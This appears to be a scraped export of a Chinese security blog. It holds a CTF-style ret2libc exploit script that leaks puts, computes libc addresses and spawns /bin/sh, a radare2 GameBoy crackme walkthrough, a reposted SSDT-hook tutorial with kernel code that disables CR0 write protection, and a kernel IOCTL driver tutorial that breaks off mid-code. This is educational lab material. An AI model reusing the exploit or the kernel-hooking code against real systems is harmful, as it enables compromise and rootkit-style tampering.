payload payload = &quot;A&quot;*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) leak = p.recv(4) leak = u32(leak) log.info(&quot;puts is at: 0x%x&quot; % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(&quot;libc base: 0x%x&quot; % libc_base) #Calculate offsets system_addr = libc_base + offset_system exit_addr = libc_base + offset_exit binsh_addr = libc_base + offset_str_bin_sh log.info(&quot;system is at: 0x%x&quot; % system_addr) log.info(&quot;/bin/sh is at: 0x%x&quot; % binsh_addr) log.info(&quot;exit is at: 0x%x&quot; % exit_addr) #build 2nd payload payload2 = &quot;A&quot;*140 ropchain2 = p32(system_addr) ropchain2 += p32(exit_addr) ropchain2 += p32(binsh_addr) payload2 = payload2 + ropchain2 p.sendline(payload2) log.success(&quot;Here comes the shell!&quot;) p.clean() p.interactive() if __name__ == &quot;__main__&quot;: main() 我们接下来的任务就是使用radare2找到偏移量 填充后，成功拿到shell 我们回顾下这次实验中是如何pwn的： 主要分为两个阶段。 第一个阶段，我们需要：140字节的填充，PLT中puts的地址，入口点，GOT中puts的地址。 目的：泄露puts的地址。通过多次执行，发现中put的地址是改变的，即我们事先不能预测它的地址，所以为了获取真实地址我们必须通过偏移量，基址进行计算得到。 对应我们的脚本 exploit1.py 第二个阶段，我们需要：140字节的填充，system@libc,exit@libc,&#x2F;bin&#x2F;sh地址 对应我们的脚本exploit.py 目的：计算偏移，基址获取关键函数的真实地址，从而系统调用拿到shell 总结一下，关键的步骤：多次泄露puts的地址-》发现地址随机，无法事先预测地址-》计算偏移，基址来获取关键函数调用真实地址-》拿到shell 进阶本实验旨在通过radare2来解决GameBoy ROM挑战的一个项目：simple.gb 首先我们在radare2打开二进制文件，检查它的架构、格式（i命令给出关于二进制文件的信息，~是r2内部的grep命令） 由上图可以看出这是一个GameBoy的ROM，那么在阅读了它的一些指令集之后我们该去完成这次挑战了 安装模拟器并测试，发现失败后有字符FAIL 回到kali，查看FAIL地址（izzq会打印出存在于整个二进制文件中的字符串） pd打印反汇编代码并查找对应的位置 我们可以看到在0x2e4引用，所以我们搜索这个地址，并打印该函数：（s addr 用于定位到某个地址，pdf用于打印出反汇编函数） 我们可以看到，radare2识别出我们的函数从0x274开始。在底部有一些比较操作，然后跳转到失败的消息或者其他消息（字符串在0x02ee），我们去那儿看看。（ps意思是打印字符串，@是一个临时搜索） 我们找到了win 那么我们给0x274重命名为check_input，然后开始分析 VV需要大写 可以看到，函数结合了很多跳转和if条件语句 我们发现函数检查每个数字，并将其与正确的比较。在左边我们可以看到有效数字。让我们快速查看这些块。我们使用p在不同视图之间再次切换，直到达到常规图形模式。 简单地看了一下，大概地明白程序的意思了：二进制程序检查是否每个位置上的数字都与特定的值相等。使用cmp imm命令按照这个顺序:3,7,5,1,9检查。 再仔细分析汇编， 在第一个块中，0x4被移动到hl（ld指令)，而hl又移动到寄存器bc，然后bc中引用的值与0x3进行比较。bc指向我们的输入，因此此处的检查功能检查bc+4是否等于0x3。在下一个块中，我们可以看到返回到其原始值的bc现在增加了两次(Inc)（bc+2），它所引用的值与0x7进行了比较。在示例的最后一个块中，bc返回其初始值，然后递增一次，其引用值与0x5比较。 那么逻辑就应该是这样的： 123456789def check_password (guess): if guess[4]==3 and guess[2]==7 and guess[1]==5 andguess[3]==1 and guess[0]==9: print &quot;WIN!&quot; else: print &quot;FAIL!&quot; 由上述代码代码逻辑可以看出，输入的数字作为数组排列的话，真实顺序应该为95713","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"SSDTHook","slug":"SSDTHook","date":"2024-02-06T08:11:24.000Z","updated":"2024-02-06T08:16:39.712Z","comments":true,"path":"2024/02/06/SSDTHook/","link":"","permalink":"https://qianmuoy.github.io/2024/02/06/SSDTHook/","excerpt":"","text":"SSDT Hook底层原理介绍以及如何实现进程保护 - 知乎 本文为转载文章，点击标题跳转至原文。如转载有侵权行为，请告知删除。 SSDT Hook效果图加载驱动并成功Hook NtTerminateProcess函数： 当对 指定的进程进行保护后，尝试使用“任务管理器”结束进程的时候，会弹出“拒绝访问”的窗口，说明，我们的目的已经达到： SSDT简介SSDT 的全称是 System Services Descriptor Table，系统服务描述符表。 这个表就是一个把 Ring3 的 Win32 API 和 Ring0 的内核 API 联系起来。 SSDT 并不仅仅只包含一个庞大的地址索引表，它还包含着一些其它有用的信息，诸如地址索引的基地址、服务函数个数等。 通过修改此表的函数地址可以对常用 Windows 函数及 API 进行 Hook，从而实现对一些关心的系统动作进行过滤、监控的目的。 一些 HIPS、防毒软件、系统监控、注册表监控软件往往会采用此接口来实现自己的监控模块。 SSDT结构SSDT即系统服务描述符表，它的结构如下(参考《Undocument Windows 2000 Secretes》第二章): 1234567891011121314151617// KSYSTEM_SERVICE_TABLE 和 KSERVICE_TABLE_DESCRIPTOR// 用来定义 SSDT 结构typedef struct _KSYSTEM_SERVICE_TABLE&#123; PULONG ServiceTableBase; // SSDT (System Service Dispatch Table)的基地址 PULONG ServiceCounterTableBase; // 用于 checked builds, 包含 SSDT 中每个服务被调用的次数 ULONG NumberOfService; // 服务函数的个数, NumberOfService * 4 就是整个地址表的大小 ULONG ParamTableBase; // SSPT(System Service Parameter Table)的基地址&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;typedef struct _KSERVICE_TABLE_DESCRIPTOR&#123; KSYSTEM_SERVICE_TABLE ntoskrnl; // ntoskrnl.exe 的服务函数 KSYSTEM_SERVICE_TABLE win32k; // win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持) KSYSTEM_SERVICE_TABLE notUsed1; KSYSTEM_SERVICE_TABLE notUsed2;&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR; 内核中有两个系统服务描述符表,一个是KeServiceDescriptorTable(由ntoskrnl.exe导出),一个是KeServieDescriptorTableShadow(没有导出)。 两者的区别是，KeServiceDescriptorTable仅有ntoskrnel一项，KeServieDescriptorTableShadow包含了ntoskrnel以及win32k。一般的Native API的服务地址由KeServiceDescriptorTable分派，gdi.dll&#x2F;user.dll的内核API调用服务地址由KeServieDescriptorTableShadow分派。还有要清楚一点的是win32k.sys只有在GUI线程中才加载，一般情况下是不加载的，所以要Hook KeServieDescriptorTableShadow的话，一般是用一个GUI程序通过IoControlCode来触发(想当初不明白这点，蓝屏死机了N次都想不明白是怎么回事)。 SSDT HOOK原理关于内核 Hook 有多种类型，下面也给出一副图示： SSDT HOOK只是其中一种Hook技术，本篇文章主要讲解SSDT Hook的使用。 SSDT HOOK原理图 通过Kernel Detective工具，我们可以发现，SSDT Hook前后，NtTerminateProcess的当前地址会发生变化，其中，变化后的当前地址：0xF885A110为我们自定义的Hook函数（即：HookNtTerminateProcess）的地址。这样，以后每次执行NtTerminateProcess的时候，就会根据执行“当前地址”所指向的函数了，这也就是SSDT Hook的原理。 另外，看雪的”堕落天才”写的不错，我直接引用下： SSDT HOOK 的原理其实非常简单，我们先实际看看KeServiceDescriptorTable是什么样的。 12345lkd&gt; dd KeServiceDescriptorTable 8055ab80 804e3d20 00000000 0000011c 804d9f48 8055ab90 00000000 00000000 00000000 00000000 8055aba0 00000000 00000000 00000000 00000000 8055abb0 00000000 00000000 00000000 00000000 如上,80587691 805716ef 8057ab71 80581b5c 这些就是系统服务函数的地址了。比如当我们在ring3调用OpenProcess时，进入sysenter的ID是0x7A(XP SP2)，然后系统查KeServiceDescriptorTable，大概是这样KeServiceDescriptorTable.ntoskrnel.ServiceTableBase(804e3d20) + 0x7A * 4 &#x3D; 804E3F08,然后804E3F08 -&gt;8057559e 这个就是OpenProcess系统服务函数所在,我们再跟踪看看: 123456lkd&gt; u 8057559e nt!NtOpenProcess: 8057559e 68c4000000 push 0C4h 805755a3 6860b54e80 push offset nt!ObReferenceObjectByPointer+0x127 (804eb560) 805755a8 e8e5e4f6ff call nt!InterlockedPushEntrySList+0x79 (804e3a92) 805755ad 33f6 xor esi,esi 原来8057559e就是NtOpenProcess函数所在的起始地址。嗯，如果我们把8057559e改为指向我们函数的地址呢？比如 MyNtOpenProcess，那么系统就会直接调用MyNtOpenProcess，而不是原来的NtOpenProcess了。这就是SSDT HOOK 原理所在。 Hook前准备我们要修改SSDT表，首先这个表必须是可写的，但在xp以后的系统中他都是只读的，三个办法来修改内存保护机制 (1) 更改注册表 恢复页面保护：HKLM\\SYSTEM\\CurrentControlset\\Control\\Session Manger\\Memory Management\\EnforceWriteProtection&#x3D;0 去掉页面保护：HKLM\\SYSTEM\\CurrentControlset\\Control\\Session Manger\\Memory Management\\DisablePagingExecutive&#x3D;1 (2)改变CR0寄存器的第1位 Windows对内存的分配，是采用的分页管理。其中有个CR0寄存器，如下图： 其中第1位叫做保护属性位，控制着页的读或写属性。如果为1，则可以读&#x2F;写&#x2F;执行；如果为0，则只可以读&#x2F;执行。 SSDT，IDT的页属性在默认下都是只读，可执行的，但不能写。 代码如下： 123456789101112131415161718192021222324252627282930313233343536 //设置为不可写void DisableWrite()&#123; __try &#123; _asm &#123; mov eax, cr0 or eax, 10000h mov cr0, eax sti &#125; &#125; __except(1) &#123; DbgPrint(&quot;DisableWrite执行失败！&quot;); &#125;&#125;// 设置为可写void EnableWrite()&#123; __try &#123; _asm &#123; cli mov eax,cr0 and eax,not 10000h //and eax,0FFFEFFFFh mov cr0,eax &#125; &#125; __except(1) &#123; DbgPrint(&quot;EnableWrite执行失败！&quot;); &#125;&#125; （3）通过Memory Descriptor List(MDL) 具体做法可以google下，这里就不介绍了 如何获得SSDT中函数的地址呢？这里主要使用了两个宏： ①获取指定服务的索引号：SYSCALL_INDEX ②获取指定服务的当前地址：SYSCALL_FUNCTION 这两个宏的具体定义如下： 1234567//根据 ZwServiceFunction 获取 ZwServiceFunction 在 SSDT 中所对应的服务的索引号 #define SYSCALL_INDEX(ServiceFunction) (*(PULONG)((PUCHAR)ServiceFunction + 1)) //根据ZwServiceFunction 来获得服务在 SSDT 中的索引号，然后再通过该索引号来获取ntServiceFunction的地址 #define SYSCALL_FUNCTION(ServiceFunction) KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[SYSCALL_INDEX(ServiceFunction)] SSDT Hook流程 在驱动的入口函数中(DriverEntry),对未进行SSDT Hook前的SSDT表进行了备份（用一个数组保存），备份时，一个索引号对应一个当前地址，如上图所示。 这样，在解除Hook的时候，就可以从全局数组中根据索引号获取未Hook前的服务名的当前地址，以便将原来的地址写回去，这一步很重要。 当用户选择保护某个进程的时候，就会通过DeviceIoControl发送一个IO_INSERT_PROTECT_PROCESS控制码给驱动程序，此时驱动程序会生成一个IRP:IRP_MJ_DEVICE_CONTROL,我们事先已经在驱动程序中为 IRP_MJ_DEVICE_CONTROL指定了一个派遣函数：SSDTHook_DispatchRoutine_CONTROL。在该派遣函数中：我们通过获取控制码（是保护进程还是取消保护进程），如果是要保护某个进程，则通过DeviceIoControl的第3个参数将要保护的进程的pid传递给驱动程序。然后在派遣函数SSDTHook_DispatchRoutine_CONTROL中从缓冲区中读取该pid，如果是要保护进程，则将要“保护进程”的pid添加到一个数组中，如果是要“取消保护进程”，则将要取消保护的进程PID从数组中移除。 在Hook NtTermianteProcess函数后，会执行我们自定义的函数：HookNtTerminateProcess，在HookNtTerminateProcess函数中，我们判断当前进程是否在要保护的进程数组中，如果该数组中存在该pid，则我们返回一个“权限不够”的异常，如果进程保护数组中不存在该pid，则直接调用原来 SSDT 中的 NtTerminateProcess 来结束进程。 SSDT Hook实现进程保护有了上面的理论基础之后，接下来可以谈谈SSDT Hook实现进程保护的具体实现了。 实现进程保护，可以Hook NtTermianteProcess，另外也可以Hook NtOpenProcess，这里，我是Hook NtTermianteProcess。 SSDT Hook原理一节中已经说过，SSDT Hook原理的本质是：自定义一个函数（HookNtTerminateProcess），让系统服务NtTermianteProcess的当前地址指向我们自定义函数地址。 这一步工作是在驱动入口函数中执行的。当驱动加载的时候，将自定义函数的地址写入SSDT表中NtTermianteProcess服务的当前地址： 123456789101112131415161718 // 实现 Hook 的安装，主要是在 SSDT 中用 newService 来替换掉 oldServiceNTSTATUS InstallHook(ULONG oldService, ULONG newService)&#123; __try &#123; ULONG uOldAttr = 0; EnableWrite(); //去掉页面保护 KdPrint((&quot;伪造NtTerminateProcess地址: %x\\n&quot;,(int)newService)); //KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[SYSCALL_INDEX(oldService)] = newService; SYSCALL_FUNCTION(oldService) = newService;// DisableWrite(); //恢复页面保护 return STATUS_SUCCESS; &#125; __except(1) &#123; KdPrint((&quot;安装Hook失败!&quot;)); &#125;&#125; 这里需要注意的是：在Hook前，需要去掉内存的页面保护属性，Hook后，需要回复内存的页面保护属性。 HookNtTerminateProcess函数的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445//************************************// 函数名称 : HookNtTerminateProcess// 描 述 : 自定义的 NtOpenProcess，用来实现 Hook Kernel API// 日 期 : 2013/06/28// 参 数 : ProcessHandle:进程句柄 ExitStatus:// 返 回 值 : //************************************NTSTATUS HookNtTerminateProcess(__in_opt HANDLE ProcessHandle,__in NTSTATUS ExitStatus)&#123; ULONG uPID; NTSTATUS rtStatus; PCHAR pStrProcName; PEPROCESS pEProcess; ANSI_STRING strProcName; // 通过进程句柄来获得该进程所对应的 FileObject 对象，由于这里是进程对象，自然获得的是 EPROCESS 对象 rtStatus = ObReferenceObjectByHandle(ProcessHandle, FILE_READ_DATA, NULL, KernelMode, (PVOID*)&amp;pEProcess, NULL); if (!NT_SUCCESS(rtStatus)) &#123; return rtStatus; &#125; // 保存 SSDT 中原来的 NtTerminateProcess 地址 pOldNtTerminateProcess = (NTTERMINATEPROCESS)oldSysServiceAddr[SYSCALL_INDEX(ZwTerminateProcess)]; // 通过该函数可以获取到进程名称和进程 ID，该函数在内核中实质是导出的(在 WRK 中可以看到) // 但是 ntddk.h 中并没有到处，所以需要自己声明才能使用 uPID = (ULONG)PsGetProcessId(pEProcess); pStrProcName = _strupr((TCHAR *)PsGetProcessImageFileName(pEProcess));//使用微软未公开的PsGetProcessImageFileName函数获取进程名 // 通过进程名来初始化一个 ASCII 字符串 RtlInitAnsiString(&amp;strProcName, pStrProcName); if (ValidateProcessNeedProtect(uPID) != -1) &#123; // 确保调用者进程能够结束(这里主要是指 taskmgr.exe) if (uPID != (ULONG)PsGetProcessId(PsGetCurrentProcess())) &#123; // 如果该进程是所保护的的进程的话，则返回权限不够的异常即可 return STATUS_ACCESS_DENIED; &#125; &#125; // 对于非保护的进程可以直接调用原来 SSDT 中的 NtTerminateProcess 来结束进程 rtStatus = pOldNtTerminateProcess(ProcessHandle, ExitStatus); return rtStatus;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"使用IO控制码进行通信","slug":"使用IO控制码进行通信","date":"2024-02-06T06:47:36.000Z","updated":"2024-02-06T08:12:06.713Z","comments":true,"path":"2024/02/06/使用IO控制码进行通信/","link":"","permalink":"https://qianmuoy.github.io/2024/02/06/%E4%BD%BF%E7%94%A8IO%E6%8E%A7%E5%88%B6%E7%A0%81%E8%BF%9B%E8%A1%8C%E9%80%9A%E4%BF%A1/","excerpt":"","text":"使用IO控制码进行驱动间通信 驱动对象用DRIVER_OBJECT数据结构表示，它作为驱动的一个实例被内核加载，并且内核对一个驱动只加 载一个实例。确切地说，是由内核中的I&#x2F;O管理器负责加载的。 每个驱动程序会创建一个或多个设备对象，用DEVICE_OBJECT数据结构表示。每个设备对象都会有一个指 针指向下一个设备对象，因此就形成一个设备链。设备链的第一个设备是由上一节介绍的DRIVER_OBJECT 结构体中指明的。设备对象保存设备特征和状态的信息。 DriverA（Server）定义IO控制码1234567#define IOCTRL_BASE 0x800 // 定义了IO控制码的基础值，确保IO控制码唯一#define IOCTRL_CODE1(i)\\ CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_IN_DIRECT,FILE_ANY_ACCESS)#define IOCTRL_CODE2(i)\\ CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_OUT_DIRECT,FILE_ANY_ACCESS)#define DEVICE_IRP_READ IOCTRL_CODE1(1)#define DEVICE_IRP_WRITE IOCTRL_CODE2(2) CTL_CODE(DeviceType, Function, Method, Access) DeviceType：指定设备类型。在这里使用FILE_DEVICE_UNKNOWN，意味着设备类型未知或不重要。 Function：提供功能码，与IOCTRL_BASE相加用于生成特定的控制码。 Method：指定数据传输方法。这里使用METHOD_IN_DIRECT和METHOD_OUT_DIRECT，分别用于输入和输出操作，其中直接I&#x2F;O允许数据在用户空间和内核空间之间直接传输，减少拷贝开销。 Access：定义访问权限。这里使用FILE_ANY_ACCESS，表示任何人都可以访问该控制码。 进行通信（DriverEntry调用） 初始化和获取设备对象 首先，函数初始化状态变量Status为STATUS_UNSUCCESSFUL，并准备输入输出缓冲区。 使用IoGetDeviceObjectPointer根据设备名称获取设备对象（DeviceObject）和文件对象（FileObject）。这一步是必要的，因为后续操作需要这些对象来构建IRP（I&#x2F;O请求包）。 构建和发送IRP 函数通过IoBuildDeviceIoControlRequest构建一个设备IO控制请求的IRP，指定IO控制代码（在这里是DEVICE_IRP_READ），输入输出缓冲区，以及一个事件对象Event用于同步操作。 在IRP的堆栈位置中设置文件对象，这对于设备驱动处理IRP时可能是必需的。 调用IoCallDriver将IRP发送给设备驱动。 等待操作完成 如果IoCallDriver返回值表示操作未立即成功完成，代码使用KeWaitForSingleObject等待之前创建的事件被设备驱动信号化。这表示操作已完成。 完成后，通过DbgPrint打印调试信息和操作结果。 清理资源 在操作完成后，使用ObDereferenceObject减少文件对象的引用计数。注意，不需要为设备对象做这一步，因为IoGetDeviceObjectPointer只增加了文件对象的引用计数。 由于函数立即返回，NTSTAUS一般是失败的。可以使用GetLastError继续判断。操作完成的标准是KEVENT事件授信。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162void Sub_1()&#123; NTSTATUS Status = STATUS_UNSUCCESSFUL; IO_STATUS_BLOCK IoStatusBlock = &#123; 0 &#125;; TCHAR InputBuffer[100] = &#123; 0 &#125;; TCHAR OutputBuffer[100] = &#123; 0 &#125;; PFILE_OBJECT FileObject; PDEVICE_OBJECT DeviceObject; do &#123; //构建设备名字 UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L&quot;\\\\device\\\\DriverB&quot;); //字符串转换至Unicode中 //根据设备名字获取实际的设备对象和文件对象,等价于直接调用 //CreateFile(返回的句柄可以通过句柄找对象方式获得设备对象和文件对象) Status = IoGetDeviceObjectPointer(&amp;DeviceName, FILE_ALL_ACCESS, &amp;FileObject, &amp;DeviceObject); if (!NT_SUCCESS(Status)) break; //申请 IRP接口 生成DeviceIoControl 类型的Irp请求 LARGE_INTEGER offset = &#123; 0 &#125;; KEVENT Event = &#123; 0 &#125;; KeInitializeEvent(&amp;Event, SynchronizationEvent, FALSE); size_t InputSize = (wcslen(L&quot;[A]--DEVICE_IRP_READ --&gt;我要开始读取了&quot;) + 1) * 2; //发送数据的长度 RtlStringCbCopyNW(InputBuffer, sizeof(InputBuffer), L&quot;[A]--DEVICE_IRP_READ --&gt;我要开始读取了&quot;, InputSize); // PIRP Irp = IoBuildDeviceIoControlRequest( DEVICE_IRP_READ, //判断请求码 DeviceObject, InputBuffer, 100, OutputBuffer, 100, FALSE, &amp;Event, &amp;IoStatusBlock); // PIO_STACK_LOCATION IoStackLocation = IoGetNextIrpStackLocation(Irp); //获取当前的Irp堆栈 IoStackLocation-&gt;FileObject = FileObject; //函数立马返回 Status = IoCallDriver(DeviceObject, Irp); if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;[A]---&gt; 模拟调用 DeviceIoControl 成功\\r\\n&quot;); //采用无限等待方式进行等待 KeWaitForSingleObject(&amp;Event, Executive, KernelMode, FALSE, 0); DbgPrint(&quot;[A]---&gt; 数据读取完成\\r\\n&quot;); DbgPrint(&quot;[A] --&gt; read value is %ws \\r\\n&quot;, OutputBuffer); &#125; else &#123; DbgPrint(&quot;[A]---&gt; 模拟调用 DeviceIoControl 失败\\r\\n&quot;); &#125; &#125; while (0); ObDereferenceObject(FileObject); //减少引用,不需要解除Deviceobj, IoGetDeviceObjectPointer规定 return;&#125; 同样测试Write控制码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960void Sub_2()&#123; NTSTATUS Status = STATUS_UNSUCCESSFUL; IO_STATUS_BLOCK IoStatusBlock = &#123; 0 &#125;; TCHAR InputBuffer[100] = &#123; 0 &#125;; TCHAR OutputBuffer[100] = &#123; 0 &#125;; PFILE_OBJECT FileObject; PDEVICE_OBJECT DeviceObject; do &#123; //构建设备名字 UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L&quot;\\\\device\\\\DriverB&quot;); //根据设备名字获取实际的设备对象和文件对象,等价于直接调用 //CreateFile(返回的句柄可以通过句柄找对象方式获得设备对象和文件对象) Status = IoGetDeviceObjectPointer(&amp;DeviceName, FILE_ALL_ACCESS, &amp;FileObject, &amp;DeviceObject); if (!NT_SUCCESS(Status)) break; //3.申请 IRP接口 生成DeviceIoControl 类型的Irp请求 LARGE_INTEGER offset = &#123; 0 &#125;; KEVENT Event = &#123; 0 &#125;; KeInitializeEvent(&amp;Event, SynchronizationEvent, FALSE); size_t InputSize= (wcslen(L&quot;[A]--DEVICE_WRITE --&gt;我要开始读取了&quot;) + 1) * 2; RtlStringCbCopyNW(InputBuffer, sizeof(InputBuffer), L&quot;[A]--DEVICE_IRP_WRITE --&gt;我要开始读取了&quot;, InputSize); //向目标驱动的IRP_MJ_DEVICE_CONTROL PIRP Irp = IoBuildDeviceIoControlRequest( DEVICE_IRP_WRITE, //子功能码 DeviceObject, InputBuffer, 100, OutputBuffer, 100, FALSE, &amp;Event, &amp;IoStatusBlock); PIO_STACK_LOCATION IoStackLocation = IoGetNextIrpStackLocation(Irp); IoStackLocation-&gt;FileObject = FileObject; Status = IoCallDriver(DeviceObject, Irp); if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;[A]---&gt; 模拟调用 DeviceIoControl 成功\\r\\n&quot;); //采用无限等待方式进行等待 KeWaitForSingleObject(&amp;Event, Executive, KernelMode, FALSE, 0); DbgPrint(&quot;[A]---&gt; 数据读取完成\\r\\n&quot;); DbgPrint(&quot;[A] --&gt; read value is %ws \\r\\n&quot;, OutputBuffer); &#125; else &#123; DbgPrint(&quot;[A]---&gt; 模拟调用 DeviceIoControl 失败\\r\\n&quot;); &#125; &#125; while (0); ObDereferenceObject(FileObject); //减少引用,不需要解除Deviceobj, IoGetDeviceObjectPointer规定 return;&#125; DriverUnload不需要做任何操作。但需要定义。 DriverB（Client）需要做好一样的定义。 1234567#define IOCTRL_BASE 0x800#define IOCTRL_CODE1(i)\\ CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_IN_DIRECT,FILE_ANY_ACCESS)#define IOCTRL_CODE2(i)\\ CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_OUT_DIRECT,FILE_ANY_ACCESS)#define DEVICE_IRP_READ IOCTRL_CODE1(1)#define DEVICE_IRP_WRITE IOCTRL_CODE2(2) DriverEntry 创建驱动设备对象 所有MajorFunction初始化为默认派遣例程 IRP_MJ_DEVICE_CONTROL关联IoDispatchControl 123456789101112131415161718192021NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)&#123; NTSTATUS Status; int i = 0; //注册其他驱动调用函数入口 DriverObject-&gt;DriverUnload = DriverUnload; //创建驱动设备对象 Status = CreateDevice(DriverObject); for (i = 0;i &lt; IRP_MJ_MAXIMUM_FUNCTION;i++) &#123; DriverObject-&gt;MajorFunction[i] = PassThroughDispatch; //默认派遣历程 &#125; DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoDispatchControl; //主功能码与函数的关联 return Status;&#125; 创建驱动设备对象 使用UNICODE_STRING结构和RtlInitUnicodeString函数初始化设备名称为\\\\Device\\\\DriverB。这个名称在内核命名空间中唯一标识了驱动程序创建的设备。 调用IoCreateDevice函数创建设备对象。这个函数需要驱动程序对象、设备名称、设备类型（这里为FILE_DEVICE_UNKNOWN），以及是否独占访问（这里为TRUE）等参数。 设定DeviceObject的Flags属性，启用直接I&#x2F;O（DO_DIRECT_IO）。这意味着数据传输将直接在用户缓冲区和设备之间进行，而不是使用中间缓冲区。 初始化符号链接名称为\\\\??\\\\DriverB，然后调用IoCreateSymbolicLink函数创建从符号链接到设备对象的映射。这样，用户模式应用程序可以通过符号链接访问设备。 1234567891011121314151617181920212223242526272829303132333435NTSTATUS CreateDevice( IN PDRIVER_OBJECT DriverObject)&#123; NTSTATUS Status; PDEVICE_OBJECT DeviceObject; //创建设备名称 UNICODE_STRING DeviceName; RtlInitUnicodeString(&amp;DeviceName, L&quot;\\\\Device\\\\DriverB&quot;); //创建设备 Status = IoCreateDevice(DriverObject,NULL, &amp;DeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;DeviceObject); if (!NT_SUCCESS(Status)) return Status; DeviceObject-&gt;Flags |= DO_DIRECT_IO; //创建符号链接 UNICODE_STRING LinkName; RtlInitUnicodeString(&amp;LinkName, L&quot;\\\\??\\\\DriverB&quot;); Status = IoCreateSymbolicLink(&amp;LinkName, &amp;DeviceName); if (!NT_SUCCESS(Status)) &#123; IoDeleteDevice(DeviceObject); return Status; &#125; return STATUS_SUCCESS;&#125; IO派遣例程 初始化I&#x2F;O控制码（IoControlCode）、输入和输出缓冲区的大小（InputSize和OutputSize），以及状态变量（Status）。调用IoGetCurrentIrpStackLocation获取当前IRP的堆栈位置，以便访问其中的参数。 函数使用switch语句根据IRP中的IO控制码的子功能码（IoControlCode）分别处理读写请求（DEVICE_IRP_READ和DEVICE_IRP_WRITE）。 对于读请求（DEVICE_IRP_READ），函数尝试从MDL（内存描述列表）获取输入缓冲区地址，并将一段预定义的文本复制到系统缓冲区中作为输出。 对于写请求（DEVICE_IRP_WRITE），函数从系统缓冲区读取输入数据，并尝试将一段预定义的文本复制到通过MDL获取的输出缓冲区中。 最后都要完成IO请求（IoCompleteRequest），并对IOSB成员进行设置。 除了“缓冲区”方式读写设备外，另外一种方式是直接方式读写设备。这种方式需要创建完设备对象后， 在设置设备属性的时候，设置为DO_DIRECT_IO，而不是设置DO_BUFFERED_IO属性。操作系统先将用户模式的地址锁定后，操作系统用内存描述符表（MDL数据结构）记录这段内存。 MDL记录这段虚拟内存，这段虚拟内存的大小存储在mdl-&gt;ByteCount里，这段虚拟内存的第一个页地址是 mdl-&gt;StartVa，这段虚拟内存的首地址对于第一个页地址的偏移量是mdl-&gt;ByteOffset。因此，这段虚拟 内存的首地址应该是mdl-&gt;StartVa+mdl-&gt;ByteOffset。DDK提供了几个宏方便程序员得到这几个数值。 123#define MmGetMdlByteCount(Mdl) ((Mdl)-&gt;ByteCount) #define MmGetMdlByteOffset(Mdl) ((Mdl)-&gt;ByteOffset) #define MmGetMdlVirtualAddress(Mdl) \\ ((PVOID) ((PCHAR) ((Mdl)-&gt;StartVa) + (Mdl)-&gt;ByteOffset)) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485NTSTATUS IoDispatchControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)&#123; //Sure it&#x27;s our driver //如果不进入If直接完成Irp if (1) //省略了判断是否为自己的驱动 &#123; if (NULL == Irp) return STATUS_UNSUCCESSFUL; BOOLEAN IsOk = FALSE; ULONG IoControlCode = 0; ULONG InputSize = 0; ULONG OutputSize = 0; NTSTATUS Status = STATUS_UNSUCCESSFUL; PIO_STACK_LOCATION IrpStackLocation = NULL; do &#123; IrpStackLocation = IoGetCurrentIrpStackLocation(Irp); IoControlCode = IrpStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode; //获得子功能码 InputSize = IrpStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength; OutputSize = IrpStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength; switch (IoControlCode) &#123; case DEVICE_IRP_READ: &#123; PVOID InputBuffer = NULL; PVOID OutputBuffer = NULL; InputBuffer = MmGetSystemAddressForMdlSafe(Irp-&gt;MdlAddress, NormalPagePriority);; OutputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer; size_t v7 = (wcslen(L&quot;[B]--&gt;Read&quot;) + 1) * 2; if (InputBuffer != NULL) &#123; DbgPrint(&quot;[B]---&gt; 获取到的输入缓冲区为: %ws\\r\\n&quot;, InputBuffer); RtlCopyMemory(OutputBuffer, L&quot;[B]--&gt;Read&quot;, v7); DbgPrint(&quot;[B]---&gt; 设置的输出缓冲区为: %ws\\r\\n&quot;, OutputBuffer); Irp-&gt;IoStatus.Status = STATUS_SUCCESS; Irp-&gt;IoStatus.Information = v7; IoCompleteRequest(Irp, IO_NO_INCREMENT); //完成请求 return STATUS_UNSUCCESSFUL; &#125; &#125; break; case DEVICE_IRP_WRITE: &#123; PVOID InputBuffer = NULL; PVOID OutputBuffer = NULL; InputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer; OutputBuffer = MmGetSystemAddressForMdlSafe(Irp-&gt;MdlAddress, NormalPagePriority);; size_t v7 = (wcslen(L&quot;[B]--&gt;Write&quot;) + 1) * 2; if (InputBuffer != NULL) &#123; DbgPrint(&quot;[B]---&gt; 获取到的输入缓冲区为: %ws\\r\\n&quot;, InputBuffer); //显示给你的数据 RtlCopyMemory(OutputBuffer, 